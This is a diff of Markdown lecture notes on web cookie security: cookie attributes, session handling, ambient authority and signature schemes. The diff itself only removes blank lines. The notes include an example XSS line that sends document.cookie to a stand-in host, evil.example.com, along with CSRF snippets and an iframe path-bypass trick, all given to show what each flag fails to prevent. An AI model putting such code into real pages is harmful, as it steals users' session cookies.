@@ -17,7 +17,6 @@ Introduction:
 
 - Implemented in 1994 in Netscape and described in 4-page draft
 - No spec for 17 years:
-
   - Attempt made in 1997,but made incompatible changes
   - Another attempt in 2000 ("Cookie2"), same problem
   - Around 2011, another effort succeeded (RFC 6265)
@@ -109,7 +108,6 @@ document.cookie;
 ## Cookie Attributes
 
 - `Domain`: Allows the cookie to be scoped to a domain broader than the domain that returned the `Set-Cookie` header
-
   - e.g. `login.stanford.edu` could set a cookie for `stanford.edu`
   - Set the domain for which the cookie is available
 
@@ -119,12 +117,10 @@ document.cookie;
   ```
 
 - `Path`: Scope the "Cookie" header to a particular request path prefix:
-
   - e.g. `Path=/docs` will match `/docs` and `/docs/Web`
   - Set subfolders and pages for which the cookie is available
   - Do not use for security
   - `Path` dose not protect against unauthorized reading of the cookie from a different path on the same origin
-
     - Can be bypassed using an `<iframe>` with the path of the cookie
     - Then, read `iframe.contentDocument.cookie`
 
@@ -141,7 +137,6 @@ document.cookie;
   ```
 
 - `Expires`: Specifies expiration date. Determine when the cookie should be deleted
-
   - The date and time are specified in the form: `Wdy, DD Mon YYYY HH:MM:SS GMT`, or `Wdy, DD Mon YY HH:MM:SS GMT` (69 >= `yy` > 0)
   - Use a reasonable expiration date for your cookies
   - _30 - 90 days_
@@ -161,40 +156,32 @@ document.cookie;
   ```
 
 - `Secure`:
-
   - Only sends cookie to server when using **HTTPS scheme**
   - Avoid transmission over an insecure channel. Cannot set cookies with secure flag using HTTP
   - Protects against cookies being stolen by man in the middle attack
   - No protection against:
-
     - XSS: from `example.com` - `fetch('https://evil.example.com?val=' + document.cookie)`
     - CSRF: from `evil.com` - `fetch('https://example.com', { credentials: document.cookie })`
     - CSRF via HTML injection: `evil.com` - `<a href="https://example.com">click me</a>`
 
 - `HttpOnly`:
-
   - Forbids JavaScript from accessing cookie
   - Don't let JavaScript read a cookie's value
   - Protects against cookies being stolen by XSS attack
   - No protection against:
-
     - CSRF: from `evil.com` - `fetch('https://example.com', { credentials: 'include' })`
     - CSRF via HTML injection: `evil.com` - `<a href="https://example.com">click me</a>`
 
 - `SameSite`:
-
   - Cookie not sent with cross-site requests
   - Limited protection against CSRF
   - `SameSite=None`: Default, always send cookies
   - `SameSite=Lax`: Withhold cookies on sub-resource requests originating from other sites, allow them on top-level requests
-
     - Limited protection against cookies being used for CSRF attack
     - No protection against:
-
       - CSRF via HTML injection: `evil.com` --> `<a href="https://example.com">click me</a>`
 
   - `SameSite=Strict`: Only send cookies if the request originates from the website that set the cookie
-
     - Complete protection against cookies being used for CSRF attack
 
 How long can cookies last?
@@ -215,13 +202,11 @@ Cookies are bound to **sites**, not **origins**.
 - Goal: Server keeps a set of data related to a user's current "browsing session"
 - Always store session information in cookies. Do NOT pass session information as a parameter
 - To secure session cookies:
-
   - Set `Secure` and `HttpOnly` flags
   - Set `Domain` and `Path` as narrow as possible
   - Set the `Expires` header to 0, except for persistent cookies
 
 - Examples:
-
   - Logins
   - Shopping carts
   - User tracking
@@ -259,11 +244,9 @@ Session creation:
 
 - **Access control**: Regulate who can view resources or take actions
 - **Ambient authority**: Access control based on a **global and persistent property** of the requester
-
   - The alternative is explicit authorization **valid only for a specific action**
 
 - There are four types of ambient authority on the web:
-
   - **Cookies**: most common, most versatile method
   - **IP checking**: used at Stanford for library resources
   - **Built-in HTTP authentication**: rarely used
@@ -287,17 +270,14 @@ Problems with ambient authority:
 Signature schemes:
 
 - Triple of algorithms (G (generator), S (Sign), V (verifier)):
-
   - **`G() --> (pk, sk)`**: generator returns public key and secret key
   - **`S(sk, x) --> t`**: signer returns a tag **`t`** for input **`x`**
   - **`V(pk, x, t) --> accept|reject`**: checks validity of tag **`t`** for given input **`x`**
 
 - Correctness property:
-
   - **`V(pk, x, S(sk, x)) == accept`**: should always be _true_
 
 - Security property:
-
   - **`V(pk, x, t) == accept`**: should almost never be true when **`x`** and **`t`** are chosen by the attacker
 
 ## Cookie Theft And Session Hijacking
